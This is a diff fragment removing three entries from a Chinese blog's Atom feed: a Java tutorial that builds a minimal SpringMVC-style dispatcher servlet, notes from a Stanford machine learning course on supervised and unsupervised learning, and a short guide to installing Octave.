class="line">    String value();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>然后创建MyDispatcherServlet这个类，去继承HttpServlet，重写init方法、doGet、doPost方法，以及加上我们第二步分析时要实现的功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div></pre></td><td class="code"><pre><div class="line">package com.liugh.servlet;</div><div class="line"></div><div class="line">import java.io.File;</div><div class="line">import java.io.IOException;</div><div class="line">import java.io.InputStream;</div><div class="line">import java.lang.reflect.Method;</div><div class="line">import java.net.URL;</div><div class="line">import java.util.ArrayList;</div><div class="line">import java.util.Arrays;</div><div class="line">import java.util.HashMap;</div><div class="line">import java.util.List;</div><div class="line">import java.util.Map;</div><div class="line">import java.util.Map.Entry;</div><div class="line">import java.util.Properties;</div><div class="line"></div><div class="line">import javax.servlet.ServletConfig;</div><div class="line">import javax.servlet.ServletException;</div><div class="line">import javax.servlet.http.HttpServlet;</div><div class="line">import javax.servlet.http.HttpServletRequest;</div><div class="line">import javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line">import com.liugh.annotation.MyController;</div><div class="line">import com.liugh.annotation.MyRequestMapping;</div><div class="line"></div><div class="line">public class MyDispatcherServlet extends HttpServlet&#123;</div><div class="line">	</div><div class="line">	private Properties properties = new Properties();</div><div class="line">	</div><div class="line">	private List&lt;String&gt; classNames = new ArrayList&lt;&gt;();</div><div class="line">	</div><div class="line">	private Map&lt;String, Object&gt; ioc = new HashMap&lt;&gt;();</div><div class="line">	</div><div class="line">	private Map&lt;String, Method&gt; handlerMapping = new  HashMap&lt;&gt;();</div><div class="line">	</div><div class="line">	private Map&lt;String, Object&gt; controllerMap  =new HashMap&lt;&gt;();</div><div class="line">	</div><div class="line"></div><div class="line">	@Override</div><div class="line">	public void init(ServletConfig config) throws ServletException &#123;</div><div class="line">		</div><div class="line">		//1.加载配置文件</div><div class="line">		doLoadConfig(config.getInitParameter(&quot;contextConfigLocation&quot;));</div><div class="line">		</div><div class="line">		//2.初始化所有相关联的类,扫描用户设定的包下面所有的类</div><div class="line">		doScanner(properties.getProperty(&quot;scanPackage&quot;));</div><div class="line">		</div><div class="line">		//3.拿到扫描到的类,通过反射机制,实例化,并且放到ioc容器中(k-v  beanName-bean) beanName默认是首字母小写</div><div class="line">		doInstance();</div><div class="line">		</div><div class="line">		//4.初始化HandlerMapping(将url和method对应上)</div><div class="line">		initHandlerMapping();</div><div class="line">		</div><div class="line">		</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	</div><div class="line"></div><div class="line">	@Override</div><div class="line">	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</div><div class="line">		this.doPost(req,resp);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	@Override</div><div class="line">	protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</div><div class="line">		try &#123;</div><div class="line">			//处理请求</div><div class="line">			doDispatch(req,resp);</div><div class="line">		&#125; catch (Exception e) &#123;</div><div class="line">			resp.getWriter().write(&quot;500!! Server Exception&quot;);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	</div><div class="line">	private void doDispatch(HttpServletRequest req, HttpServletResponse resp) throws Exception &#123;</div><div class="line">		if(handlerMapping.isEmpty())&#123;</div><div class="line">			return;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		String url =req.getRequestURI();</div><div class="line">		String contextPath = req.getContextPath();</div><div class="line">		</div><div class="line">		url=url.replace(contextPath, &quot;&quot;).replaceAll(&quot;/+&quot;, &quot;/&quot;);</div><div class="line">		</div><div class="line">		if(!this.handlerMapping.containsKey(url))&#123;</div><div class="line">			resp.getWriter().write(&quot;404 NOT FOUND!&quot;);</div><div class="line">			return;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		Method method =this.handlerMapping.get(url);</div><div class="line">		</div><div class="line">		//获取方法的参数列表</div><div class="line">		Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();</div><div class="line">	</div><div class="line">		//获取请求的参数</div><div class="line">		Map&lt;String, String[]&gt; parameterMap = req.getParameterMap();</div><div class="line">		</div><div class="line">		//保存参数值</div><div class="line">		Object [] paramValues= new Object[parameterTypes.length];</div><div class="line">		</div><div class="line">		//方法的参数列表</div><div class="line">        for (int i = 0; i&lt;parameterTypes.length; i++)&#123;  </div><div class="line">            //根据参数名称，做某些处理  </div><div class="line">            String requestParam = parameterTypes[i].getSimpleName();  </div><div class="line">            </div><div class="line">            </div><div class="line">            if (requestParam.equals(&quot;HttpServletRequest&quot;))&#123;  </div><div class="line">                //参数类型已明确，这边强转类型  </div><div class="line">            	paramValues[i]=req;</div><div class="line">                continue;  </div><div class="line">            &#125;  </div><div class="line">            if (requestParam.equals(&quot;HttpServletResponse&quot;))&#123;  </div><div class="line">            	paramValues[i]=resp;</div><div class="line">                continue;  </div><div class="line">            &#125;</div><div class="line">            if(requestParam.equals(&quot;String&quot;))&#123;</div><div class="line">            	for (Entry&lt;String, String[]&gt; param : parameterMap.entrySet()) &#123;</div><div class="line">         			String value =Arrays.toString(param.getValue()).replaceAll(&quot;\\[|\\]&quot;, &quot;&quot;).replaceAll(&quot;,\\s&quot;, &quot;,&quot;);</div><div class="line">         			paramValues[i]=value;</div><div class="line">         		&#125;</div><div class="line">            &#125;</div><div class="line">        &#125;  </div><div class="line">		//利用反射机制来调用</div><div class="line">		try &#123;</div><div class="line">			method.invoke(this.controllerMap.get(url), paramValues);//obj是method所对应的实例 在ioc容器中</div><div class="line">		&#125; catch (Exception e) &#123;</div><div class="line">			e.printStackTrace();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	private void  doLoadConfig(String location)&#123;</div><div class="line">		//把web.xml中的contextConfigLocation对应value值的文件加载到留里面</div><div class="line">		InputStream resourceAsStream = this.getClass().getClassLoader().getResourceAsStream(location);</div><div class="line">		try &#123;</div><div class="line">			//用Properties文件加载文件里的内容</div><div class="line">			properties.load(resourceAsStream);</div><div class="line">		&#125; catch (IOException e) &#123;</div><div class="line">			e.printStackTrace();</div><div class="line">		&#125;finally &#123;</div><div class="line">			//关流</div><div class="line">			if(null!=resourceAsStream)&#123;</div><div class="line">				try &#123;</div><div class="line">					resourceAsStream.close();</div><div class="line">				&#125; catch (IOException e) &#123;</div><div class="line">					e.printStackTrace();</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	private void doScanner(String packageName) &#123;</div><div class="line">		//把所有的.替换成/</div><div class="line">		URL url  =this.getClass().getClassLoader().getResource(&quot;/&quot;+packageName.replaceAll(&quot;\\.&quot;, &quot;/&quot;));</div><div class="line">		File dir = new File(url.getFile());</div><div class="line">		for (File file : dir.listFiles()) &#123;</div><div class="line">			if(file.isDirectory())&#123;</div><div class="line">				//递归读取包</div><div class="line">				doScanner(packageName+&quot;.&quot;+file.getName());</div><div class="line">			&#125;else&#123;</div><div class="line">				String className =packageName +&quot;.&quot; +file.getName().replace(&quot;.class&quot;, &quot;&quot;);</div><div class="line">				classNames.add(className);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	</div><div class="line">	</div><div class="line">	private void doInstance() &#123;</div><div class="line">		if (classNames.isEmpty()) &#123;</div><div class="line">			return;</div><div class="line">		&#125;	</div><div class="line">		for (String className : classNames) &#123;</div><div class="line">			try &#123;</div><div class="line">				//把类搞出来,反射来实例化(只有加@MyController需要实例化)</div><div class="line">				Class&lt;?&gt; clazz =Class.forName(className);</div><div class="line">			   if(clazz.isAnnotationPresent(MyController.class))&#123;</div><div class="line">					ioc.put(toLowerFirstWord(clazz.getSimpleName()),clazz.newInstance());</div><div class="line">				&#125;else&#123;</div><div class="line">					continue;</div><div class="line">				&#125;</div><div class="line">				</div><div class="line">				</div><div class="line">			&#125; catch (Exception e) &#123;</div><div class="line">				e.printStackTrace();</div><div class="line">				continue;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	private void initHandlerMapping()&#123;</div><div class="line">		if(ioc.isEmpty())&#123;</div><div class="line">			return;</div><div class="line">		&#125;</div><div class="line">		try &#123;</div><div class="line">			for (Entry&lt;String, Object&gt; entry: ioc.entrySet()) &#123;</div><div class="line">				Class&lt;? extends Object&gt; clazz = entry.getValue().getClass();</div><div class="line">				if(!clazz.isAnnotationPresent(MyController.class))&#123;</div><div class="line">					continue;</div><div class="line">				&#125;</div><div class="line">				</div><div class="line">				//拼url时,是controller头的url拼上方法上的url</div><div class="line">				String baseUrl =&quot;&quot;;</div><div class="line">				if(clazz.isAnnotationPresent(MyRequestMapping.class))&#123;</div><div class="line">					MyRequestMapping annotation = clazz.getAnnotation(MyRequestMapping.class);</div><div class="line">					baseUrl=annotation.value();</div><div class="line">				&#125;</div><div class="line">				Method[] methods = clazz.getMethods();</div><div class="line">				for (Method method : methods) &#123;</div><div class="line">					if(!method.isAnnotationPresent(MyRequestMapping.class))&#123;</div><div class="line">						continue;</div><div class="line">					&#125;</div><div class="line">					MyRequestMapping annotation = method.getAnnotation(MyRequestMapping.class);</div><div class="line">					String url = annotation.value();</div><div class="line">					</div><div class="line">					url =(baseUrl+&quot;/&quot;+url).replaceAll(&quot;/+&quot;, &quot;/&quot;);</div><div class="line">					handlerMapping.put(url,method);</div><div class="line">					controllerMap.put(url,clazz.newInstance());</div><div class="line">					System.out.println(url+&quot;,&quot;+method);</div><div class="line">				&#125;</div><div class="line">				</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">		&#125; catch (Exception e) &#123;</div><div class="line">			e.printStackTrace();</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	/**</div><div class="line">	 * 把字符串的首字母小写</div><div class="line">	 * @param name</div><div class="line">	 * @return</div><div class="line">	 */</div><div class="line">	private String toLowerFirstWord(String name)&#123;</div><div class="line">		char[] charArray = name.toCharArray();</div><div class="line">		charArray[0] += 32;</div><div class="line">		return String.valueOf(charArray);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">		</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这里我们就开发完了自己的SpringMVC，现在我们测试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">package com.liugh.core.controller;</div><div class="line"></div><div class="line">import java.io.IOException;</div><div class="line"></div><div class="line">import javax.servlet.http.HttpServletRequest;</div><div class="line">import javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line">import com.liugh.annotation.MyController;</div><div class="line">import com.liugh.annotation.MyRequestMapping;</div><div class="line">import com.liugh.annotation.MyRequestParam;</div><div class="line"></div><div class="line">@MyController</div><div class="line">@MyRequestMapping(&quot;/test&quot;)</div><div class="line">public class TestController &#123;</div><div class="line">	</div><div class="line"></div><div class="line">	</div><div class="line">	 @MyRequestMapping(&quot;/doTest&quot;)</div><div class="line">    public void test1(HttpServletRequest request, HttpServletResponse response,</div><div class="line">    		@MyRequestParam(&quot;param&quot;) String param)&#123;</div><div class="line"> 		System.out.println(param);</div><div class="line">	    try &#123;</div><div class="line">            response.getWriter().write( &quot;doTest method success! param:&quot;+param);</div><div class="line">        &#125; catch (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">	 </div><div class="line">	 </div><div class="line">	 @MyRequestMapping(&quot;/doTest2&quot;)</div><div class="line">    public void test2(HttpServletRequest request, HttpServletResponse response)&#123;</div><div class="line">        try &#123;</div><div class="line">            response.getWriter().println(&quot;doTest2 method success!&quot;);</div><div class="line">        &#125; catch (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>访问<a href="http://localhost:8080/liughMVC/test/doTest?param=liugh如下：" target="_blank" rel="external">http://localhost:8080/liughMVC/test/doTest?param=liugh如下：</a></p>
-<p><img src="/images/springMVC-04.jpg" alt="test" title="springMVC-04"></p>
-<p>访问一个不存在的试试：<br><img src="/images/springMVC-05.jpg" alt="test" title="springMVC-05"></p>
-<p>到这里我们就大功告成了！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Spring框架对于Java后端程序员来说再熟悉不过了，以前只知道它用的反射实现的，但了解之后才知道有很多巧妙的设计在里面。如果不看Spring的源码，你将会失去一次和大师学习的机会：它的代码规范，设计思想很值得学习。我们程序员大部分人都是野路子，不懂什么叫代码规范。写了一
-    
-    </summary>
-    
-      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
-    
-    
-      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>斯坦福机器学习课程|第一周(1)认识机器学习</title>
-    <link href="http://yoursite.com/2018/02/22/%E6%96%AF%E5%9D%A6%E7%A6%8F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E7%AC%AC%E4%B8%80%E5%91%A8-1-%E8%AE%A4%E8%AF%86%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://yoursite.com/2018/02/22/斯坦福机器学习课程-第一周-1-认识机器学习/</id>
-    <published>2018-02-22T11:08:52.000Z</published>
-    <updated>2018-02-22T03:47:46.296Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="生活中机器学习的影子"><a href="#生活中机器学习的影子" class="headerlink" title="生活中机器学习的影子"></a>生活中机器学习的影子</h3><p>在生活中，每天你都可能在不知不觉中使用了各种各样的机器学习算法。比如，当你每一次使用像诸如谷歌 (Google)或必应 (Bing) 的搜索引擎时，它们运作得如此之好的原因之一便是，由Google或微软实现的一种学习算法可以“学会”如何对网页进行排名；每当你使用脸书 (Facebook)或苹果 (Apple) 的照片处理应用时，它们都能自动识别出你朋友的照片，这也是机器学习的一种；每当你阅读电子邮件时，你的垃圾邮件过滤器帮你免受大量垃圾邮件的困扰，这也是通过一种学习算法实现的。还有一个让我兴奋的理由，是一个关于人工智能的梦想：有朝一日，我们能创造出像你我一样聪明的机器，尽管我们离这个目标仍有很长的距离，但许多的人工智能专家相信，实现这一目标最好的途径是通过学习算法，来模拟人类大脑的学习方式。</p>
-<p>话说，为什么机器学习在当今如此流行呢？ 机器学习发源于人工智能领域 我们希望能够创造出具有智慧的机器。我们通过编程来让机器完成一些基础的工作，比如如何找到从A到B的最短路径，但在大多数情况下，我们并不知道如何显式地编写人工智能程序，来做一些更有趣的任务。比如网页搜索，标记照片和拦截垃圾邮件等。人们意识到唯一能够达成这些目标的方法，就是让机器自己学会如何去做。因而，机器学习已经发展成为计算机的一项新能力，并且与工业界和基础科学界有着紧密的联系。</p>
-<p>身处机器学习领域。我常常会在短短一周中与形形色色的人打交道 如直升机飞行员、生物学家、还有许多计算机系统专家。比如我在斯坦福的同事们，同时平均每周我还会数次收到来自硅谷的业界人士的email，咨询我是否有兴趣将机器学习算法应用到他们所遇到的实际问题中，以上的例子都彰显了机器学习所能处理的问题范围之广。在硅谷，机器学习引导着大量的课题。如自主机器人、计算生物学等。机器学习的实例还有很多，比如数据库挖掘。机器学习变得如此流行的原因之一，便是网络和自动化算法的爆炸性增长，这意味着我们掌握了比以往多得多的数据集。举例来说，当今有数不胜数的硅谷企业，在收集有关网络点击的数据 (Clickstream Data) 并试图在这些数据上运用机器学习的算法来更好的理解和服务用户，这在硅谷已经成为了一项巨大的产业。随着电子自动化的发展，我们现在拥有了电子医疗记录，如果我们能够将这些记录转变为医学知识，那我们就能对各种疾病了解的更深入，同时，计算生物学也在电子自动化的辅助下快速发展。生物学家收集了大量有关基因序列以及DNA序列的数据，通过对其应用机器学习的算法来帮助我们跟深入地理解人类基因组，及其对我们人类的意义，几乎工程界的所有领域，都在使用机器学习算法来分析日益增长的海量数据集。有些机器应用我们并不能够通过手工编程来实现，比如说，我个人对自动直升机有着许多年的研究，想要写出一个能让直升机自主飞行的程序几乎是不可能的任务。唯一可行的解决方案就是让一台计算机能够自主地学会如何让直升机飞行。再比如手写识别，如今将大量的邮件，按地址分类寄送到全美甚至全球的代价大大降低，其中重要的理由之一便是每当你写下这样一封信时 一个机器学习的算法已经学会如何读懂你的笔迹并自动地将你的信件发往它的目的地.所以邮寄跨越上万里的信件的费用也很低。你也许曾经接触过自然语言处理和计算机视觉，事实上，这些领域都是试图通过人工智能来理解人类的语言和图像，如今大多数的自然语言处理和计算机视觉都是对机器学习的一种应用。</p>
-<p><strong>机器学习算法也在用户自定制化程序(self-customizing program)中有着广泛的应用</strong>，每当你使用亚马逊、Netflix或iTunes Genius的服务时，都会收到它们为你量身推荐的电影或产品。这就是通过学习算法来实现的。可以相信，这些应用都有着上千万的用户，而针对这些海量的用户编写千万个不同的程序显然是不可能的。唯一有效的解决方案就是开发出能够自我学习，定制出符合你喜好的并据此进行推荐的软件，最后，机器学习算法已经被应用于探究人类的学习方式，并试图理解人类的大脑。我们也将会了解到研究者是如何运用机器学习的工具，来一步步实现人工智能的梦想。</p>
-<h3 id="机器学习的分类"><a href="#机器学习的分类" class="headerlink" title="机器学习的分类"></a>机器学习的分类</h3><h4 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h4><p>来个例子：</p>
-<p>假设你想预测房价（无比需要啊！)，之前，某学生已经从某地收集了数据集（不是中国的，囧） 其中一个数据集是这样的。</p>
-<p><img src="/images/机器学习-监督学习-01.png" alt="机器学习-监督学习-01" title="机器学习-监督学习-01"></p>
-<p>这是横坐标，即不同房子的面积，单位平方脚（^-^） 纵轴上是房价，单位 千美元。 根据给定数据，假设你朋友有栋房子，750平尺（70平米） 想知道这房子能卖多少，好卖掉。 那么，学习算法怎么帮你呢？学习算法可以： 绘出一条直线，让直线尽可能匹配到所有数据。</p>
-<p><img src="/images/机器学习-监督学习-02.png" alt="机器学习-监督学习-02" title="机器学习-监督学习-02"></p>
-<p>于此，看上去，那个房子应该、可能、也许、大概 卖到15万美元（一平米两千刀！）。但这不是唯一的学习算法。可能还有更好的。比如不用直线了，可能平方函数会更好，即二次多项式更符合数据集。如果你这样做，预测结果就应该是20万刀（一平三千刀，涨价好快）。</p>
-<p><img src="/images/机器学习-监督学习-03.png" alt="机器学习-监督学习-03" title="机器学习-监督学习-03"></p>
-<p>对于应该选择直线还是曲线，不是我们现在关心的问题。我们需要知道的是这是一个监督学习得例子。术语监督学习，意指给出一个算法，需要部分数据集已经有正确答案。比如给定房价数据集， 对于里面每个数据，算法都知道对应的正确房价，即这房子实际卖出的价格。算法的结果就是算出更多的正确价格，比如那个新房子，你朋友想卖的那个。</p>
-<p>用更术语的方式来定义，监督学习又叫回归问题，（应该是回归属于监督中的一种）意指要预测一个连续值的输出，比如房价。虽然从技术上，一般把房价记到美分单位。所以实际还是个离散值，但通常把它看作实际数字，是一个标量值，一个连续值的数，而术语回归，意味着要预测这类连续值属性的种类。</p>
-<h4 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h4><p>在监督学习中，我们用到的例子中的数据集，每个样本，都已经被标明为正样本或者负样本，即良性或恶性肿瘤。</p>
-<p>因此，对于监督学习中的每一个样本，我们已经被清楚地告知了什么是所谓的正确答案，即它们是良性还是恶性。在无监督学习中，我们用的数据会和监督学习里的看起来有些不一样。在无监督学习中，没有属性或标签这一概念，也就是说所有的数据都是一样的，没有区别。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;生活中机器学习的影子&quot;&gt;&lt;a href=&quot;#生活中机器学习的影子&quot; class=&quot;headerlink&quot; title=&quot;生活中机器学习的影子&quot;&gt;&lt;/a&gt;生活中机器学习的影子&lt;/h3&gt;&lt;p&gt;在生活中，每天你都可能在不知不觉中使用了各种各样的机器学习算法。比如，当你每
-    
-    </summary>
-    
-      <category term="机器学习" scheme="http://yoursite.com/categories/machine/"/>
-    
-    
-      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>运维|安装Octave</title>
-    <link href="http://yoursite.com/2018/02/22/%E8%BF%90%E7%BB%B4-%E5%AE%89%E8%A3%85Octave/"/>
-    <id>http://yoursite.com/2018/02/22/运维-安装Octave/</id>
-    <published>2018-02-22T10:42:45.000Z</published>
-    <updated>2018-02-22T03:47:05.440Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="What-is-Octave"><a href="#What-is-Octave" class="headerlink" title="What is Octave"></a>What is Octave</h3><p>Octave是一个旨在提供与Matlab语法兼容的开放源代码科学计算及数值分析的工具。Octave是在GNU协议下被开放的，这意味着它一直是可以免费下载的。</p>
-<h3 id="在Windows下安装Octave"><a href="#在Windows下安装Octave" class="headerlink" title="在Windows下安装Octave"></a>在Windows下安装Octave</h3><p>使用这个链接来在Windows安装Octave:</p>
-<blockquote>
-<p><a href="http://wiki.octave.org/Octave_for_Microsoft_Windows" target="_blank" rel="external">http://wiki.octave.org/Octave_for_Microsoft_Windows</a></p>
-</blockquote>
-<h3 id="在GNU-Linux上安装Octave"><a href="#在GNU-Linux上安装Octave" class="headerlink" title="在GNU/Linux上安装Octave"></a>在GNU/Linux上安装Octave</h3><ul>
-<li>在Ubuntu上，你可以使用：<ul>
-<li>sudo apt-get update &amp;&amp; sudo apt-get install octave</li>
-</ul>
-</li>
-<li>在Fedora上，你可以使用：<ul>
-<li>sudo yum install octave-forge</li>
-</ul>
-</li>
-<li>在Red Hat Enterprise/CentOS上，你可以使用：<ul>
-<li>Method One:<ul>
-<li><blockquote>
-<p>yum install epel-release<br>  yum install octave</p>
-</blockquote>
-</li>
-</ul>
-</li>
-<li>Method Two:<ul>
-<li><blockquote>
-<p>wget <a href="http://url/to/latest/epel-release-6-7.noarch.rpm" target="_blank" rel="external">http://url/to/latest/epel-release-6-7.noarch.rpm</a><br> yum localinstall epel-release-6-7.noarch.rpm </p>
-</blockquote>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>在CentOS上，可以到 <a href="https://fedoraproject.org/wiki/EPEL" target="_blank" rel="external">https://fedoraproject.org/wiki/EPEL</a> 中选择自己需要的Octave版本。</p>
-<p>Octave is available for Red Hat Enterprise Linux distributions through the <a href="https://fedoraproject.org/wiki/EPEL" target="_blank" rel="external">EPEL</a> repository. This section applies to CentOS, Scientific Linux, and other Red Hat Enterprise rebuild distributions as well.</p>
-<blockquote>
-<p>参考 <a href="http://wiki.octave.org/Octave_for_GNU/Linux" target="_blank" rel="external">http://wiki.octave.org/Octave_for_GNU/Linux</a></p>
-</blockquote>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;What-is-Octave&quot;&gt;&lt;a href=&quot;#What-is-Octave&quot; class=&quot;headerlink&quot; title=&quot;What is Octave&quot;&gt;&lt;/a&gt;What is Octave&lt;/h3&gt;&lt;p&gt;Octave是一个旨在提供与Matlab语法
-    
-    </summary>
-    
-      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
-    
-    
-      <category term="Octave" scheme="http://yoursite.com/tags/Octave/"/>
     
   </entry>
   
